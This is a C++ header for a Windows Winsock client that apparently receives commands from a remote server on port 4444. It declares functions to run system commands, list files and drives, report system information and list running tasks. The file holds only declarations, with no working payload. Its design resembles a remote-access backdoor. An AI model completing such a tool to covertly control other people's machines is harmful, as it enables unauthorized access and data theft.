#pragma once

#undef UNICODE
#define WIN32_LEAN_AND_MEAN

//Necessary libraries
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <sstream>
#include <vector>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
#include <fstream>

#pragma comment (lib, "Ws2_32.lib")

#define DEFAULT_PORT "4444"

//This function will return true if the user selects a drive that is available for use
bool choseAvailableDrive(std::string input);

//This function gives the server the ability to process commands sent to the client
void processCommand(std::vector<char> buffer, std::vector<char>& outputBuffer);

//This function allows the user to specify which drive to use
std::string setDriveLetter();

//This function will list all files in the directory
void listFiles(std::vector<char>& outputBuffer, std::string directory);

//This function will display system information
void printSystem(std::vector<char>& outputBuffer);

//This function is to verify that the input is letters
bool isLetters(std::string input);

//This function is used to print out the tasks
void printTasks(std::vector<char>& outputBuffer);

//Function to execute system 
std::string exec(const char* cmd);


